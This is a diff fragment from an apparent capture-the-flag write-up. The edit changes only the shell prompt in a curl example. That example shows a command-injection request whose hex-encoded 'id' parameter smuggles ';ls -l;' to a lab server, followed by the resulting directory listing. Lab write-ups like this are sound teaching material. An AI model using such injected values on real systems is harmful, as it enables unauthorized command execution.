@@ -83,7 +83,7 @@ sh: 1: _6.jpg: not found
 Nothing interesting in the source code so let's try a ";ls -l;" : 
 
 ```bash
-> curl "http://10.13.37.5/?id=0x3b6c73202d6c3b&usr=1"
+$> curl "http://10.13.37.5/?id=0x3b6c73202d6c3b&usr=1"
 total 32
 -rw-r--r-- 1 root root    38 Oct  1 22:14 6e8218531e0580b6754b3e3be5252873.txt
 drwxrwxr-x 2 root root  4096 Oct  1 22:14 images
